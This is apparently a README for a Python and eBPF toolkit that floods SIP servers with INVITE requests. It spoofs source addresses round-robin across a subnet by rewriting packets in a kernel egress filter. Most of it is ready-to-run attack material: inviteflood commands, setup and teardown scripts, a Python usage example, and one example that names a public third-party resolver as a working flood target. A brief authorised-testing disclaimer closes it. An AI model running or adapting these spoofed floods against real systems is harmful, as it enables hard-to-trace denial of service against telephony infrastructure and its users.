# eBPF-Enhanced InviteFlood Attack Module

This directory contains an advanced eBPF-based SIP INVITE flood attack implementation that uses Traffic Control (TC) filters for sophisticated packet spoofing.

## Files

- `attack_ebpf_inviteflood.py` - Main eBPF-enhanced attack module
- `test_ebpf_attack.py` - Test script demonstrating usage
- `setup_inviteflood_spoof.sh` - Helper script for eBPF setup
- `spoof_kern.c` - eBPF kernel program for packet spoofing
- `load_tc_spoofer.sh` - Load eBPF TC filters
- `unload_tc_spoofer.sh` - Unload eBPF TC filters
- `status_tc_spoofer.sh` - Check eBPF filter status

## Important Limitations

### eBPF TC Egress Path Limitation

**Critical**: eBPF Traffic Control filters only work on packets that actually traverse the network interface's egress path. This means:

- ✅ **Works**: Targeting external/remote IP addresses
- ❌ **Doesn't work**: Targeting the local interface IP (loopback traffic)

**Example**:
```bash
# Your interface IP
ip addr show wlan0
# Output: inet 143.53.142.93/21 ...

# ❌ This WON'T be spoofed (loopback traffic)
inviteflood wlan0 200 143.53.142.93 143.53.142.93 5 -S 4000

# ✅ This WILL be spoofed (external traffic)  
inviteflood wlan0 200 8.8.8.8 8.8.8.8 5 -S 4000
```

The reason is that packets destined to the local interface IP are handled internally by the network stack and never reach the TC egress filters where our eBPF program is attached.

## Features

### Advanced eBPF Spoofing
- **Round-robin IP spoofing**: Cycles through IP addresses in a configurable subnet
- **Random source ports**: Generates random ephemeral ports (49152-65535)
- **Traffic Control integration**: Uses TC egress filters for packet manipulation
- **Kernel-level performance**: eBPF runs in kernel space for high performance

### Attack Capabilities
- **SIP INVITE flooding**: Sends multiple SIP INVITE requests
- **Configurable parameters**: Target IP/port, packet count, source port
- **Dry-run mode**: Test configuration without sending packets
- **Automatic cleanup**: Properly removes eBPF filters on completion

## Usage

### Basic Usage
```python
from sip_attacks.ePBF2.attack_ebpf_inviteflood import EbpfInviteFloodAttack

# Create attack instance
attack = EbpfInviteFloodAttack(
    target_ip="143.53.142.93",
    target_port=5060,
    interface="wlan0", 
    source_port=4000,
    max_count=5,
    spoofing_subnet="10.10.123.0/24"
)

# Run the attack
attack.run()
```

### Command Line Test
```bash
# Run the test script
./test_ebpf_attack.py
```

### Manual eBPF Setup
```bash
# Set up eBPF spoofing manually
./setup_inviteflood_spoof.sh wlan0 143.53.142.93 10.10.123.0/24 5060 4000

# Run inviteflood (packets will be automatically spoofed)
sudo inviteflood wlan0 200 143.53.142.93 143.53.142.93 5 -S 4000 -D 5060

# Clean up eBPF filters
./unload_tc_spoofer.sh wlan0
```

## Requirements

- `clang` - LLVM compiler for eBPF
- `tc` - Traffic Control utility
- `bpftool` - eBPF inspection tool
- `inviteflood` - SIP INVITE flood tool
- Root privileges for eBPF and raw socket operations

## How It Works

1. **eBPF Program**: The `spoof_kern.c` program is compiled to eBPF bytecode
2. **TC Filter**: Attached to the network interface's egress path
3. **Packet Matching**: Filters UDP packets to target IP:port
4. **Spoofing**: Modifies source IP (round-robin) and source port (random)
5. **Attack Execution**: `inviteflood` sends packets normally, eBPF modifies them

## Configuration

The eBPF program is configured via BPF maps:
- `spoof_cfg`: Target IP/port, spoofing subnet, source port filter
- `spoof_rr`: Round-robin counter for IP selection

## Example: Converting Your Command

Your original command:
```bash
inviteflood wlan0 200 143.53.142.93 143.53.142.93 5 -i 10.10.123.1 -S 4000
```

Becomes:
```python
attack = EbpfInviteFloodAttack(
    interface="wlan0",
    target_ip="143.53.142.93", 
    target_port=5060,  # Default SIP port
    max_count=5,
    source_port=4000,
    spoofing_subnet="10.10.123.0/24"  # Subnet around your source IP
)
attack.run()
```

The eBPF program will automatically spoof packets from the entire `10.10.123.0/24` subnet instead of just `10.10.123.1`.

## Troubleshooting

- **Permission denied**: Ensure you have root privileges
- **Compilation errors**: Check that `clang` and kernel headers are installed
- **TC errors**: Verify that Traffic Control is supported on your interface
- **Map errors**: Check that `/sys/fs/bpf` is mounted
- **Spoofing not working**: 
  - Check if targeting local interface IP (use external IP instead)
  - Verify eBPF program is loaded: `tc filter show dev <interface> egress`
  - Check eBPF maps: `sudo bpftool map show pinned /sys/fs/bpf/tc/globals/spoof_cfg`
  - Use `tcpdump` to verify packet modification: `sudo tcpdump -i <interface> -n host <target_ip>`

## Security Notice

This tool is for educational and authorized testing purposes only. Ensure you have proper authorization before testing against any systems.
